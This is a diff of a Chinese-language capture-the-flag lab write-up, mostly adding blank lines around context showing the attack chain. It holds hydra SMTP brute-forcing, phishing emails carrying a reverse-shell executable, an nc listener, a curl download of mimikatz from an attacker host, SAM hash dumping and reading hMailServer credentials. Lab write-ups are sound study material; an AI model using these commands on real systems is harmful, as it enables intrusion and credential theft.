@@ -45,8 +45,10 @@ repost:
 <!-- Place resource files in the current article directory and reference them using relative paths, like this: `![alt](images/screenshot.jpg)`. -->
 
 先查看题目给出的网站
+
 ![](images/667c671cc1a91a091bfd34d6b4aa338e.png)
 在Our Team页面发现一些邮箱，根据题目内容可能和题目有关
+
 ![](images/d7e9da3c9f4fc60a659357cf17d03700.png)
 
 ```
@@ -141,6 +143,8 @@ hydra测试邮箱登录密码（nmap扫描得到smtp端口为587）
 hydra -L email.txt -P password.txt 10.10.84.228 smtp -s 587 -t 16
 ```
 
+
+
 ![](images/c8608fafe5c0b2c4789458a04b763577.png)获得邮箱账号登录密码，尝试利用反向shell创建可执行文件
 
 ``` Shell
@@ -154,12 +158,15 @@ for email in $(cat email.txt); do sendemail -f "lhedvig@brownbrick.co" -t "$emai
 ```
 
 发送成功
+
 ![](images/7b55538990b1f3b03cf57a415715f964.png)
 同时监听443端口
 
 ``` Shell
 nc -lnvp 443
 ```
+
+
 
 ![](images/29a41743e330c4d6afae6484bc4984c0.png)
 发现此时的权限是wrohit，尝试获取桌面flag
@@ -168,6 +175,8 @@ nc -lnvp 443
 dir C:\Users\wrohit\Desktop
 type C:\Users\wrohit\Desktop\flag.txt
 ```
+
+
 
 ![](images/6eb99a9624e7d686bb3be955787bcfbc.png)
 接下来尝试查找wrohit用户的密码，此时该用户是位于Administrators下的，所以只需要把mimikatz.exe上传即可，上传至ProgramData文件夹内
@@ -182,8 +191,11 @@ curl http://10.10.200.215:8888/mimikatz.exe -o mimikatz.exe
 .\mimikatz.exe "token::elevate" "lsadump::sam" "exit"
 ```
 
+
+
 ![](images/1c7a8fbb3cee2b5e8f7c1d8b2db34f4e.png)
 在线平台破解哈希即可 https://crackstation.net/
+
 ![](images/fcb42c276516424eb3a2f9bdfdb023ee.png)
 最后任务是找到hMailServer Administrator Dashboard
 该密码存在在在`C:\Program Files (x86)\hMailServer\Bin\hMailServer.INI`
@@ -193,10 +205,14 @@ curl http://10.10.200.215:8888/mimikatz.exe -o mimikatz.exe
 type "C:\Program Files (x86)\hMailServer\Bin\hMailServer.INI"
 ```
 
+
+
 ![](images/f9c9c1df8587bd0d2a24ceca819a5c18.png)
 破解哈希
+
 ![](images/714215a672e9cb9b2449ccddce01fdd8.png)
 结束
+
 
 
 ![](images/9304f15558c8f132b296223569b71418.png)
